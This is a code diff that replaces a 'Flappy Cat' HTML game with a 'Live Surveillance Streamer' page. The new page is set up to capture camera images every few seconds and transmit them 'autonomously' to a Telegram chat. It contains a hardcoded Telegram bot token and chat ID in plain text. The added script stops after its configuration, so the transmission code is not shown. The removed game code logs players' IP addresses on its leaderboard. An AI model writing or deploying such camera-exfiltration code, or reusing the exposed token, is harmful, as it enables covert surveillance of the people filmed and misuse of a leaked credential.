@@ -1,1307 +1,294 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<meta name="apple-mobile-web-app-capable" content="yes">
-<title>Flappy Cat 🐱</title>
-<style>
-  @import url('https://fonts.googleapis.com/css2?family=Fredoka+One&family=Nunito:wght@700;900&display=swap');
-  * { margin:0; padding:0; box-sizing:border-box; -webkit-tap-highlight-color:transparent; }
-  html,body {
-    width:100%; height:100%;
-    background:#1a1a2e;
-    display:flex; justify-content:center; align-items:center;
-    overflow:hidden; touch-action:none;
-    font-family:'Fredoka One',cursive;
-  }
-  #wrap { position:relative; width:min(100vw,430px); height:min(100vh,720px); }
-  canvas { display:block; width:100%; height:100%; }
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Live Surveillance Streamer - MISSION CRITICAL</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
+    <style>
+        /* --- Global & Body Styling --- */
+        body {
+            font-family: 'Roboto', sans-serif;
+            background-color: #121212; /* Dark Mode Background for Spy feel */
+            color: #e0e0e0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 20px;
+            min-height: 100vh;
+        }
+        h1 {
+            color: #4CAF50; /* Green Accent for "Go Signal" */
+            margin-bottom: 10px;
+            text-align: center;
+        }
+        #statusArea {
+            background-color: #2c2c2c;
+            padding: 10px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            width: 90%;
+            max-width: 600px;
+            text-align: center;
+        }
 
-  .panel {
-    position:absolute; inset:0;
-    display:flex; flex-direction:column;
-    align-items:center; justify-content:center; gap:12px;
-    pointer-events:none; opacity:0; transition:opacity .2s;
-    overflow-y:auto;
-  }
-  .panel.show { opacity:1; pointer-events:auto; }
+        /* --- Camera View Container --- */
+        #cameraContainer {
+            position: relative;
+            width: 90%;
+            max-width: 720px; 
+            border: 5px solid #4CAF50;
+            box-shadow: 0 0 20px rgba(76, 175, 80, 0.7);
+            border-radius: 10px;
+            overflow: hidden;
+        }
 
-  .card {
-    background:rgba(255,255,255,0.93);
-    border-radius:22px; padding:18px 30px;
-    text-align:center; min-width:230px;
-    box-shadow:0 10px 40px rgba(0,0,0,.25);
-    border:3px solid #f4c430;
-  }
-  .title { font-size:clamp(24px,6vw,32px); color:#1a1a2e; text-shadow:2px 2px 0 #f4c430; }
-  .hint  { font-family:'Nunito',sans-serif; font-size:clamp(11px,3vw,14px); font-weight:800; color:#555; animation:pulse 1.3s ease-in-out infinite; }
-  .score-big { font-size:clamp(36px,9vw,50px); color:#1a1a2e; }
-  .lbl { font-family:'Nunito',sans-serif; font-size:clamp(9px,2.3vw,11px); font-weight:900; letter-spacing:2px; color:#999; text-transform:uppercase; margin-bottom:2px; }
-  .row { display:flex; gap:26px; justify-content:center; margin-top:6px; }
-  .col { text-align:center; }
-  .best-v { font-size:clamp(20px,5vw,26px); color:#f59e0b; }
+        /* Video element for live feed */
+        #videoElement {
+            width: 100%;
+            display: block;
+        }
 
-  .btn {
-    pointer-events:auto; cursor:pointer;
-    background:#f4c430; border:3px solid #c8960a;
-    border-radius:50px; padding:11px 36px;
-    font-family:'Fredoka One',cursive;
-    font-size:clamp(14px,4vw,19px); color:#1a1a2e;
-    box-shadow:0 5px 0 #a07000;
-    transition:transform .08s, box-shadow .08s;
-  }
-  .btn:active { transform:translateY(3px); box-shadow:0 2px 0 #a07000; }
-  .btn-row { display:flex; gap:14px; flex-wrap:wrap; justify-content:center; }
+        canvas {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 10;
+        }
 
-  #hud { position:absolute; inset:0; pointer-events:none; display:none; }
-  #hud.show { display:block; }
-  #coin-hud {
-    position:absolute; top:12px; left:12px;
-    background:rgba(255,255,255,.88);
-    border:2px solid #f4c430; border-radius:50px;
-    padding:5px 14px 5px 10px;
-    display:flex; align-items:center; gap:6px;
-    font-size:clamp(14px,4vw,18px); color:#1a1a2e;
-  }
-  #score-hud {
-    position:absolute; top:12px; left:50%; transform:translateX(-50%);
-    font-size:clamp(28px,7vw,38px); color:#fff;
-    text-shadow:0 3px 0 rgba(0,0,0,.4), 0 0 14px rgba(0,0,0,.2);
-  }
-  #best-hud {
-    position:absolute; top:12px; right:60px;
-    background:rgba(255,255,255,.88);
-    border:2px solid #f4c430; border-radius:50px;
-    padding:5px 14px; font-size:clamp(9px,2.5vw,12px); color:#555;
-    text-align:right; font-family:'Nunito',sans-serif; font-weight:900;
-    line-height:1.6;
-  }
-  #stage-badge {
-    position:absolute; bottom:12px; left:12px;
-    background:rgba(255,255,255,.88);
-    border:2px solid #f4c430; border-radius:50px;
-    padding:6px 16px; font-size:clamp(10px,2.5vw,13px); color:#1a1a2e;
-    font-family:'Nunito',sans-serif; font-weight:900;
-  }
-
-  #pause-btn {
-    position:absolute; top:12px; right:12px;
-    pointer-events:auto; cursor:pointer;
-    width:40px; height:40px; border-radius:50%;
-    background:rgba(255,255,255,.88); border:2px solid #f4c430;
-    display:flex; align-items:center; justify-content:center;
-    font-size:16px; box-shadow:0 3px 0 rgba(0,0,0,.15);
-    transition:transform .08s; user-select:none;
-  }
-  #pause-btn:active { transform:scale(0.9); }
-
-  #music-btn {
-    position:absolute; bottom:12px; right:12px;
-    pointer-events:auto; cursor:pointer;
-    width:38px; height:38px; border-radius:50%;
-    background:rgba(255,255,255,.82); border:2px solid #f4c430;
-    display:none; align-items:center; justify-content:center;
-    font-size:18px; box-shadow:0 3px 0 rgba(0,0,0,.12);
-    transition:transform .08s; user-select:none; z-index:10;
-  }
-  #music-btn.show { display:flex; }
-  #music-btn:active { transform:scale(0.9); }
-
-  #pPause {
-    position:absolute; inset:0;
-    display:flex; flex-direction:column;
-    align-items:center; justify-content:center; gap:14px;
-    pointer-events:none; opacity:0; transition:opacity .2s;
-    background:rgba(10,10,30,0.55); backdrop-filter:blur(3px);
-  }
-  #pPause.show { opacity:1; pointer-events:auto; }
-
-  /* Leaderboard Panel */
-  #pLeaderboard {
-    position:absolute; inset:0;
-    display:flex; flex-direction:column;
-    align-items:center; justify-content:center; gap:12px;
-    pointer-events:none; opacity:0; transition:opacity .2s;
-    padding:20px;
-  }
-  #pLeaderboard.show { opacity:1; pointer-events:auto; }
-  #pLeaderboard .card {
-    max-width:320px; max-height:450px;
-    overflow-y:auto;
-  }
-  .leaderboard-list {
-    text-align:left; font-family:'Nunito',sans-serif;
-    font-size:clamp(10px,2.5vw,12px); color:#333;
-    width:100%;
-  }
-  .lb-entry {
-    display:flex; justify-content:space-between;
-    padding:6px 0; border-bottom:1px solid #eee;
-    font-weight:700;
-  }
-  .lb-rank { color:#f59e0b; min-width:20px; }
-  .lb-ip { flex:1; margin-left:8px; word-break:break-all; }
-  .lb-score { color:#2ecc71; font-weight:900; }
-  .lb-loading { color:#999; font-style:italic; }
-
-  @keyframes pulse { 0%,100%{transform:scale(1);opacity:1} 50%{transform:scale(1.05);opacity:.75} }
-  @keyframes fadeIn { from{opacity:0} to{opacity:1} }
-</style>
+        /* --- Controls --- */
+        .controls {
+            margin-top: 30px;
+            display: flex;
+            gap: 20px;
+            flex-wrap: wrap;
+            justify-content: center;
+        }
+        button {
+            padding: 12px 25px;
+            font-size: 16px;
+            border: none;
+            border-radius: 30px;
+            cursor: pointer;
+            transition: background-color 0.3s, transform 0.1s;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
+        }
+        #startBtn {
+            background-color: #4CAF50;
+            color: white;
+        }
+        #stopBtn {
+            background-color: #F44336;
+            color: white;
+        }
+        button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 15px rgba(0, 0, 0, 0.3);
+        }
+    </style>
 </head>
 <body>
-<div id="wrap">
-  <canvas id="c"></canvas>
+    <h1>📷 Mission Objective Active (Live Streamer)</h1>
+    <p>Monitoring activated stream for autonomous capture and transmission.</p>
 
-  <!-- HUD -->
-  <div id="hud">
-    <div id="coin-hud">🪙 <span id="coin-val">0</span></div>
-    <div id="score-hud">0</div>
-    <div id="best-hud">BEST ⭐<br><span id="bv">0</span></div>
-    <div id="stage-badge">STAGE 1 🏙️</div>
-    <div id="pause-btn">⏸</div>
-  </div>
-  <div id="music-btn">🎵</div>
+    <div id="statusArea">Status: Initializing...</div>
 
-  <!-- Start Panel -->
-  <div class="panel show" id="pStart">
-    <div class="card">
-      <div class="title">🐱 Flappy Cat</div>
-      <div style="font-size:48px;margin:6px 0">🏙️🌴🚀</div>
-      <div class="hint">TAP or SPACE to fly!</div>
+    <div id="cameraContainer">
+        <video id="videoElement" autoplay muted></video>
+        <canvas id="canvasOverlay"></canvas>
     </div>
-    <div class="btn-row">
-      <div class="btn" id="btnS">▶ PLAY</div>
-      <div class="btn" style="background:#9966ff;border-color:#6633cc;box-shadow:0 5px 0 #5522aa;" id="btnLB">🏆 TOP 10</div>
-    </div>
-  </div>
 
-  <!-- Game Over Panel -->
-  <div class="panel" id="pOver">
-    <div class="card">
-      <div class="title" style="font-size:clamp(18px,5vw,24px)">😿 Game Over</div>
-      <div style="height:8px"></div>
-      <div class="lbl">SCORE</div>
-      <div class="score-big" id="goSc">0</div>
-      <div class="lbl" style="margin-top:6px">🪙 COINS</div>
-      <div style="font-size:clamp(20px,5vw,26px);color:#f59e0b" id="goCoin">0</div>
-      <div class="row">
-        <div class="col"><div class="lbl">⭐ BEST</div><div class="best-v" id="goHi">0</div></div>
-        <div class="col"><div class="lbl">⏱️ STAGES</div><div class="best-v" id="goStages">0</div></div>
-      </div>
+    <div class="controls">
+        <button id="startBtn">Start Surveillance</button>
+        <button id="stopBtn" disabled>Stop Stream</button>
     </div>
-    <div class="btn-row">
-      <div class="btn" id="btnR">↺ RETRY</div>
-      <div class="btn" style="background:#e0e0e0;border-color:#aaa;box-shadow:0 5px 0 #888;" id="btnMenu">🏠 MENU</div>
-    </div>
-  </div>
-
-  <!-- Pause Panel -->
-  <div id="pPause">
-    <div class="card">
-      <div class="title" style="font-size:clamp(20px,5vw,26px)">⏸ Paused</div>
-      <div style="height:6px"></div>
-      <div class="lbl">SCORE</div>
-      <div style="font-size:clamp(28px,7vw,38px);color:#1a1a2e" id="pauseSc">0</div>
-    </div>
-    <div class="btn-row">
-      <div class="btn" id="btnResume">▶ RESUME</div>
-      <div class="btn" style="background:#e0e0e0;border-color:#aaa;box-shadow:0 5px 0 #888;" id="btnPR">↺ RESTART</div>
-    </div>
-  </div>
-
-  <!-- Leaderboard Panel -->
-  <div id="pLeaderboard">
-    <div class="card">
-      <div class="title">🏆 TOP SCORES</div>
-      <div class="lbl" style="margin-top:8px;margin-bottom:6px;">GLOBAL LEADERBOARD</div>
-      <div class="leaderboard-list" id="lbList">
-        <div class="lb-loading">Loading IP & scores...</div>
-      </div>
-    </div>
-    <div class="btn" id="btnLBBack" style="background:#e0e0e0;border-color:#aaa;box-shadow:0 5px 0 #888;">← BACK</div>
-  </div>
-</div>
 
 <script>
-// ══════════════════════════════════════════════════════════
-//  CANVAS & UI SETUP
-// ══════════════════════════════════════════════════════════
-const cv   = document.getElementById('c');
-const ctx  = cv.getContext('2d');
-const W    = 430, H = 720;
-cv.width   = W;
-cv.height  = H;
+// =========================================================
+// === 🔴 HARDCODED USER CONFIGURATION (ACTION REQUIRED) ===
+// =========================================================
+const TELEGRAM_BOT_TOKEN = "8565643267:AAG0rnblltLejIli3XSXSr4-vpstJ5Vv5WM"; // &lt;-- BOT TOKEN PASTE HERE
+const TARGET_CHAT_ID = "8782681794";                                     // &lt;-- CHAT ID PASTE HERE (Numeric ID)
+// Capture Interval (Milliseconds): প্রতি কত সময় পর ছবি তোলা হবে
+const CAPTURE_INTERVAL_MS = 3000; // 1 সেকেন্ডে একবার
+//=========================================================
+// =========================================================
+// === ✨ CORE JAVASCRIPT LOGIC (THE ENGINE) ===
+// =========================================================
+let stream = null;          
+let captureIntervalId = null; 
+const videoElement = document.getElementById('videoElement');
+const statusArea = document.getElementById('statusArea');
+const startBtn = document.getElementById('startBtn');
+const stopBtn = document.getElementById('stopBtn');
+const canvasOverlay = document.getElementById('canvasOverlay');
+const ctx = canvasOverlay.getContext('2d');
 
-const pStart= document.getElementById('pStart');
-const pOver = document.getElementById('pOver');
-const pPause= document.getElementById('pPause');
-const pLB   = document.getElementById('pLeaderboard');
-const hud   = document.getElementById('hud');
-const coinVal=document.getElementById('coin-val');
-const scHud = document.getElementById('score-hud');
-const bvHud = document.getElementById('bv');
-const stBadge=document.getElementById('stage-badge');
-const goSc  = document.getElementById('goSc');
-const goCoin= document.getElementById('goCoin');
-const goHi  = document.getElementById('goHi');
-const goStages=document.getElementById('goStages');
-const pauseSc=document.getElementById('pauseSc');
-const pauseBtn=document.getElementById('pause-btn');
-const musicBtn=document.getElementById('music-btn');
-const lbList=document.getElementById('lbList');
-
-// ══════════════════════════════════════════════════════════
-//  IP & LEADERBOARD
-// ══════════════════════════════════════════════════════════
-let userIP = 'UNKNOWN';
-async function fetchUserIP() {
-  try {
-    const res = await fetch('https://api.ipify.org?format=json');
-    const data = await res.json();
-    userIP = data.ip;
-  } catch(e) {
-    userIP = 'LOCAL_' + Math.random().toString(36).substr(2,9);
-  }
-}
-
-function saveScore(sc) {
-  const leaderboard = JSON.parse(localStorage.getItem('fc_leaderboard') || '{}');
-  if (!leaderboard[userIP] || sc > leaderboard[userIP]) {
-    leaderboard[userIP] = sc;
-    localStorage.setItem('fc_leaderboard', JSON.stringify(leaderboard));
-  }
-}
-
-function getLeaderboard() {
-  const lb = JSON.parse(localStorage.getItem('fc_leaderboard') || '{}');
-  const entries = Object.entries(lb)
-    .map(([ip, score]) => ({ip, score}))
-    .sort((a,b) => b.score - a.score)
-    .slice(0, 10);
-  return entries;
-}
-
-function showLeaderboard() {
-  const entries = getLeaderboard();
-  if (entries.length === 0) {
-    lbList.innerHTML = '<div class="lb-loading">No scores yet. Play to get on the board!</div>';
-  } else {
-    lbList.innerHTML = entries.map((e,i) => `
-      <div class="lb-entry">
-        <span class="lb-rank">#${i+1}</span>
-        <span class="lb-ip" title="${e.ip}">${e.ip}</span>
-        <span class="lb-score">${e.score}</span>
-      </div>
-    `).join('');
-  }
-  showPanel(pLB);
-}
-
-// ══════════════════════════════════════════════════════════
-//  CONSTANTS
-// ══════════════════════════════════════════════════════════
-const GND_H    = 60;
-const CAT_X    = 90;
-const CAT_W    = 52, CAT_H = 46;
-const GRAVITY  = 0.42;
-const JUMP_V   = -9.2;
-const INIT_SPD = 3.0;
-const MAX_SPD  = 7.0;
-const GRACE_FRAMES = 90;
-const HIT_RADIUS = 13;
-
-const STAGE_CITY = 1;
-const STAGE_JUNGLE = 2;
-const STAGE_SPACE = 3;
-const STAGE_TIME = 120000; // 2 min per stage (in ms)
-
-// ══════════════════════════════════════════════════════════
-//  AUDIO (Web Audio API)
-// ══════════════════════════════════════════════════════════
-let audioCtx = null, musicOn = true, masterGain = null;
-let schedHandle = null, seqTime = 0, seqStep = 0;
-
-const BPM = 128, QUARTER = 60/BPM, SIXTEENTH = QUARTER/4;
-const N = {
-  D2:73.42, A2:110.00, G2:98.00, E2:82.41, Bb2:116.54,
-  D3:146.83, F3:174.61, G3:196.00, A3:220.00, Bb3:233.08,
-  D4:293.66, E4:329.63, Gb4:369.99, G4:392.00, A4:440.00, Bb4:466.16, B4:493.88,
-  D5:587.33, E5:659.25, Gb5:739.99, G5:783.99, A5:880.00,
-};
-
-const MELODY_SEQ = [
-  {f:N.D4,d:0.9},{f:0},{f:N.Gb4,d:0.9},{f:0},
-  {f:N.A4,d:0.9},{f:0},{f:N.G4,d:0.5},{f:N.Gb4,d:0.5},
-  {f:N.E4,d:0.9},{f:0},{f:N.D4,d:0.9},{f:0},
-  {f:N.E4,d:0.5},{f:N.Gb4,d:0.5},{f:N.G4,d:0.9},{f:0},
-  {f:N.A4,d:0.9},{f:0},{f:N.Bb4,d:0.9},{f:0},
-  {f:N.A4,d:0.5},{f:N.G4,d:0.5},{f:N.Gb4,d:0.9},{f:0},
-  {f:N.E4,d:0.9},{f:0},{f:N.D4,d:1.8},{f:0},
-  {f:0},{f:0},{f:N.Gb4,d:0.5},{f:N.A4,d:0.5},
-];
-
-const BASS_SEQ = [
-  {f:N.D2,d:1.8},{f:0},{f:0},{f:0},
-  {f:N.A2,d:0.9},{f:0},{f:0},{f:0},
-  {f:N.G2,d:1.8},{f:0},{f:0},{f:0},
-  {f:N.A2,d:0.9},{f:0},{f:0},{f:0},
-  {f:N.D2,d:1.8},{f:0},{f:0},{f:0},
-  {f:N.A2,d:0.9},{f:0},{f:0},{f:0},
-  {f:N.Bb2,d:1.8},{f:0},{f:0},{f:0},
-  {f:N.A2,d:0.9},{f:0},{f:0},{f:0},
-];
-
-const DRUMS = [
-  'KH','H','SH','H', 'KH','H','SH','H',
-  'KH','H','SH','H', 'KH','KH','SH','H',
-  'KH','H','SH','H', 'KH','H','SH','H',
-  'KH','H','SH','H', 'KH','H','SH','H',
-];
-
-function getAC() {
-  if (!audioCtx) {
-    audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-    masterGain = audioCtx.createGain();
-    masterGain.gain.value = musicOn ? 0.18 : 0;
-    masterGain.connect(audioCtx.destination);
-  }
-  return audioCtx;
-}
-
-function playKick(ac, t) {
-  const o = ac.createOscillator(), g = ac.createGain();
-  o.type = 'sine';
-  o.frequency.setValueAtTime(160, t);
-  o.frequency.exponentialRampToValueAtTime(40, t + 0.18);
-  g.gain.setValueAtTime(0.6, t);
-  g.gain.exponentialRampToValueAtTime(0.001, t + 0.22);
-  o.connect(g); g.connect(masterGain);
-  o.start(t); o.stop(t + 0.25);
-}
-
-function playSnare(ac, t) {
-  const o = ac.createOscillator(), og = ac.createGain();
-  o.type = 'triangle'; o.frequency.value = 180;
-  og.gain.setValueAtTime(0.25, t);
-  og.gain.exponentialRampToValueAtTime(0.001, t+0.12);
-  o.connect(og); og.connect(masterGain);
-  o.start(t); o.stop(t+0.14);
-  const buf = ac.createBuffer(1, ac.sampleRate*0.12, ac.sampleRate);
-  const d = buf.getChannelData(0);
-  for(let i=0;i<d.length;i++) d[i]=Math.random()*2-1;
-  const src = ac.createBufferSource(), bpf = ac.createBiquadFilter(), ng = ac.createGain();
-  src.buffer = buf;
-  bpf.type='bandpass'; bpf.frequency.value=3000; bpf.Q.value=0.8;
-  ng.gain.setValueAtTime(0.18, t);
-  ng.gain.exponentialRampToValueAtTime(0.001, t+0.11);
-  src.connect(bpf); bpf.connect(ng); ng.connect(masterGain);
-  src.start(t); src.stop(t+0.13);
-}
-
-function playHihat(ac, t) {
-  const buf = ac.createBuffer(1, ac.sampleRate*0.06, ac.sampleRate);
-  const d = buf.getChannelData(0);
-  for(let i=0;i<d.length;i++) d[i]=Math.random()*2-1;
-  const src = ac.createBufferSource(), hpf = ac.createBiquadFilter(), g = ac.createGain();
-  src.buffer = buf;
-  hpf.type='highpass'; hpf.frequency.value=8000;
-  g.gain.setValueAtTime(0.06, t);
-  g.gain.exponentialRampToValueAtTime(0.001, t+0.05);
-  src.connect(hpf); hpf.connect(g); g.connect(masterGain);
-  src.start(t); src.stop(t+0.07);
-}
-
-function playMelodyNote(ac, freq, t, dur) {
-  if (!freq) return;
-  const o = ac.createOscillator(), g = ac.createGain();
-  o.type = 'square'; o.frequency.value = freq;
-  o.detune.value = 4;
-  g.gain.setValueAtTime(0, t);
-  g.gain.linearRampToValueAtTime(0.08, t+0.01);
-  g.gain.setValueAtTime(0.08, t + dur*SIXTEENTH*0.7);
-  g.gain.linearRampToValueAtTime(0, t + dur*SIXTEENTH*0.92);
-  o.connect(g); g.connect(masterGain);
-  o.start(t); o.stop(t + dur*SIXTEENTH);
-}
-
-function playBassNote(ac, freq, t, dur) {
-  if (!freq) return;
-  const o = ac.createOscillator(), g = ac.createGain();
-  o.type = 'sawtooth'; o.frequency.value = freq;
-  const lpf = ac.createBiquadFilter();
-  lpf.type = 'lowpass'; lpf.frequency.value = 400;
-  g.gain.setValueAtTime(0, t);
-  g.gain.linearRampToValueAtTime(0.14, t+0.02);
-  g.gain.setValueAtTime(0.14, t + dur*SIXTEENTH*0.75);
-  g.gain.linearRampToValueAtTime(0, t + dur*SIXTEENTH*0.92);
-  o.connect(lpf); lpf.connect(g); g.connect(masterGain);
-  o.start(t); o.stop(t + dur*SIXTEENTH);
-}
-
-function scheduleBgMusic() {
-  if (!audioCtx || !musicOn || !masterGain) return;
-  const ac = audioCtx, ahead = 0.25, now = ac.currentTime;
-
-  while (seqTime < now + ahead) {
-    const step = seqStep % 32;
-    const mn = MELODY_SEQ[step];
-    if (mn && mn.f) playMelodyNote(ac, mn.f, seqTime, mn.d || 1);
-    const bn = BASS_SEQ[step];
-    if (bn && bn.f) playBassNote(ac, bn.f, seqTime, bn.d || 1);
-    const dr = DRUMS[step] || '';
-    if (dr.includes('K')) playKick(ac, seqTime);
-    if (dr.includes('S')) playSnare(ac, seqTime);
-    if (dr.includes('H')) playHihat(ac, seqTime);
-    seqTime += SIXTEENTH;
-    seqStep++;
-  }
-  schedHandle = setTimeout(scheduleBgMusic, 120);
-}
-
-function startBgMusic() {
-  const ac = getAC();
-  if (ac.state === 'suspended') ac.resume();
-  seqTime = ac.currentTime + 0.05;
-  seqStep = 0;
-  scheduleBgMusic();
-}
-
-function stopBgMusic() {
-  if (schedHandle) { clearTimeout(schedHandle); schedHandle = null; }
-}
-
-function pauseBgMusic() { stopBgMusic(); }
-
-function resumeBgMusic() {
-  if (!musicOn) return;
-  const ac = getAC();
-  if (ac.state === 'suspended') ac.resume();
-  seqTime = ac.currentTime + 0.05;
-  scheduleBgMusic();
-}
-
-function playCoinSound() {
-  const ac = getAC();
-  const now = ac.currentTime;
-  [[N.G5,0,0.11],[N.D5*1.5,0.08,0.09]].forEach(([f,t,d])=>{
-    const o = ac.createOscillator(), g = ac.createGain();
-    o.type='sine'; o.frequency.value=f;
-    g.gain.setValueAtTime(0,now+t);
-    g.gain.linearRampToValueAtTime(0.22,now+t+0.008);
-    g.gain.exponentialRampToValueAtTime(0.001,now+t+d);
-    o.connect(g); g.connect(ac.destination);
-    o.start(now+t); o.stop(now+t+d+0.01);
-  });
-}
-
-function playJumpSound() {
-  const ac = getAC(), now = ac.currentTime;
-  const o = ac.createOscillator(), g = ac.createGain();
-  o.type='sine'; o.frequency.setValueAtTime(280,now); o.frequency.linearRampToValueAtTime(460,now+0.07);
-  g.gain.setValueAtTime(0.07,now); g.gain.linearRampToValueAtTime(0,now+0.1);
-  o.connect(g); g.connect(ac.destination);
-  o.start(now); o.stop(now+0.12);
-}
-
-function playDeathSound() {
-  const ac = getAC(), now = ac.currentTime;
-  [[380,80,0],[220,60,0.15]].forEach(([f1,f2,t])=>{
-    const o=ac.createOscillator(), g=ac.createGain();
-    o.type='sawtooth';
-    o.frequency.setValueAtTime(f1,now+t);
-    o.frequency.linearRampToValueAtTime(f2,now+t+0.28);
-    g.gain.setValueAtTime(0.09,now+t);
-    g.gain.linearRampToValueAtTime(0,now+t+0.32);
-    o.connect(g); g.connect(ac.destination);
-    o.start(now+t); o.stop(now+t+0.35);
-  });
-}
-
-function toggleMusic() {
-  musicOn = !musicOn;
-  musicBtn.textContent = musicOn ? '🎵' : '🔇';
-  if (masterGain) {
-    masterGain.gain.setTargetAtTime(musicOn ? 0.18 : 0, audioCtx.currentTime, 0.08);
-  }
-  if (musicOn) resumeBgMusic();
-  else stopBgMusic();
-}
-
-// ══════════════════════════════════════════════════════════
-//  PERSISTENT STORAGE
-// ══════════════════════════════════════════════════════════
-let bestScore = parseInt(localStorage.getItem('fc_best') || '0');
-
-function savePersist(sc) {
-  if (sc > bestScore) {
-    bestScore = sc;
-    localStorage.setItem('fc_best', bestScore);
-  }
-  saveScore(sc);
-}
-
-// ══════════════════════════════════════════════════════════
-//  GAME STATE
-// ══════════════════════════════════════════════════════════
-const S = {IDLE:0, PLAYING:1, DYING:2, PAUSED:3};
-let state = S.IDLE;
-let cat, obstacles, coins, particles, pops;
-let score, coinCount, spd, frame, graceTimer;
-let currentStage = STAGE_CITY;
-let stageStartTime = 0;
-let gameStartTime = 0;
-
-function init() {
-  cat = { y:H/2-40, vy:0, angle:0, legPhase:0, tailPhase:0 };
-  obstacles = []; coins = []; particles = []; pops = [];
-  score = 0; coinCount = 0; spd = INIT_SPD; frame = 0;
-  graceTimer = GRACE_FRAMES;
-  currentStage = STAGE_CITY;
-  stageStartTime = 0;
-  gameStartTime = 0;
-}
-
-// ══════════════════════════════════════════════════════════
-//  STAGE SYSTEM
-// ══════════════════════════════════════════════════════════
-function updateStage() {
-  const elapsed = Date.now() - gameStartTime;
-  const stageTime = Math.floor(elapsed / STAGE_TIME);
-  
-  let newStage = STAGE_CITY;
-  if (stageTime % 3 === 0) newStage = STAGE_CITY;
-  else if (stageTime % 3 === 1) newStage = STAGE_JUNGLE;
-  else if (stageTime % 3 === 2) newStage = STAGE_SPACE;
-
-  if (newStage !== currentStage) {
-    currentStage = newStage;
-    stageStartTime = elapsed;
-    obstacles = [];
-    coins = [];
-  }
-}
-
-function getStageLabel() {
-  const labels = {
-    [STAGE_CITY]: 'STAGE 1 🏙️',
-    [STAGE_JUNGLE]: 'STAGE 2 🌴',
-    [STAGE_SPACE]: 'STAGE 3 🚀',
-  };
-  return labels[currentStage] || 'STAGE 1 🏙️';
-}
-
-function getStageCount() {
-  if (gameStartTime === 0) return 0;
-  return Math.floor((Date.now() - gameStartTime) / STAGE_TIME) + 1;
-}
-
-// ══════════════════════════════════════════════════════════
-//  BACKGROUND RENDERING
-// ══════════════════════════════════════════════════════════
-const bldFar = Array.from({length:9}, (_,i) => ({x:i*60, w:38+Math.floor(Math.random()*22), h:120+Math.floor(Math.random()*180), shade:Math.floor(Math.random()*3)}));
-const bldNear = Array.from({length:6}, (_,i) => ({x:i*80+10, w:52+Math.floor(Math.random()*28), h:80+Math.floor(Math.random()*140), shade:Math.floor(Math.random()*3)}));
-let bgOff1=0, bgOff2=0, gndOff=0;
-
-function drawBuilding(x,y,w,h,shade){
-  const palettes=[{wall:'#a8cce0',win:'#b8e0f0',stripe:'#90b8d0'},{wall:'#c0d8e8',win:'#d0ebf8',stripe:'#a8c8dc'},{wall:'#d4e6f0',win:'#e4f2fa',stripe:'#bcd4e4'}];
-  const p=palettes[shade];
-  ctx.fillStyle=p.wall; ctx.fillRect(x,y,w,h);
-  ctx.fillStyle=p.stripe; ctx.fillRect(x+w-6,y,6,h);
-  const rows=Math.floor(h/22), cols=Math.floor(w/14);
-  for(let r=1;r<rows;r++) for(let c=0;c<cols;c++){
-    const wx=x+c*14+3, wy=y+r*22-14;
-    if(wy>y&&wy+10<y+h){ctx.fillStyle=Math.random()>0.25?p.win:'#8ab0c8'; ctx.fillRect(wx,wy,8,10);}
-  }
-}
-
-function drawCloud(cx,cy,s){
-  ctx.fillStyle='rgba(255,255,255,0.76)';
-  [[cx,cy,22*s],[cx-28*s,cy+6*s,18*s],[cx+28*s,cy+8*s,16*s],[cx+10*s,cy-8*s,16*s],[cx-10*s,cy-4*s,20*s]]
-    .forEach(([x,y,r])=>{ctx.beginPath();ctx.arc(x,y,r,0,Math.PI*2);ctx.fill();});
-}
-
-function drawCityBG() {
-  // Sky
-  const sg = ctx.createLinearGradient(0,0,0,H-GND_H);
-  sg.addColorStop(0,'#1a6fc4'); sg.addColorStop(0.4,'#3a9bd5'); sg.addColorStop(1,'#87CEEB');
-  ctx.fillStyle=sg; ctx.fillRect(0,0,W,H-GND_H);
-  // Sun
-  const sunG=ctx.createRadialGradient(W*0.82,80,0,W*0.82,80,70);
-  sunG.addColorStop(0,'rgba(255,230,100,0.5)'); sunG.addColorStop(1,'rgba(255,180,0,0)');
-  ctx.fillStyle=sunG; ctx.fillRect(0,0,W,H-GND_H);
-  ctx.beginPath();ctx.arc(W*0.82,80,28,0,Math.PI*2);ctx.fillStyle='#ffe066';ctx.fill();
-  ctx.beginPath();ctx.arc(W*0.82,80,22,0,Math.PI*2);ctx.fillStyle='#fff4a0';ctx.fill();
-  // Clouds
-  drawCloud(80+(bgOff1*0.1%W),110,0.9);
-  drawCloud(240+(bgOff1*0.07%W),70,0.7);
-  drawCloud(360+(bgOff1*0.12%W),140,0.6);
-  const gndY=H-GND_H;
-  bldFar.forEach(b=>{const bx=((b.x-bgOff1*0.3)%(W+80)+W+80)%(W+80)-40; drawBuilding(bx,gndY-b.h,b.w,b.h,b.shade);});
-}
-
-function drawJungleBG() {
-  // Green sky
-  const sg = ctx.createLinearGradient(0,0,0,H-GND_H);
-  sg.addColorStop(0,'#228B22'); sg.addColorStop(0.5,'#3CB371'); sg.addColorStop(1,'#90EE90');
-  ctx.fillStyle=sg; ctx.fillRect(0,0,W,H-GND_H);
-  
-  // Sun (orange)
-  ctx.beginPath();ctx.arc(W*0.15,120,32,0,Math.PI*2);ctx.fillStyle='#FFD700';ctx.fill();
-  
-  // Trees (many layers)
-  for(let i=0;i<8;i++) {
-    const tx = (bgOff1*0.15 + i*100) % (W+60) - 30;
-    const ty = H*0.5 + Math.sin(i)*20;
-    drawJungleTree(tx, ty, 0.7 + (i%2)*0.3);
-  }
-  
-  // Vines (decorative)
-  ctx.strokeStyle = 'rgba(100,150,0,0.4)';
-  ctx.lineWidth = 2;
-  for(let i=0;i<4;i++) {
-    const x = (bgOff1*0.08 + i*120) % (W+60);
-    ctx.beginPath(); ctx.moveTo(x, 0);
-    for(let y=0;y<H-GND_H;y+=20) {
-      ctx.lineTo(x + Math.sin(y*0.02)*8, y);
-    }
-    ctx.stroke();
-  }
-}
-
-function drawJungleTree(x, y, scale) {
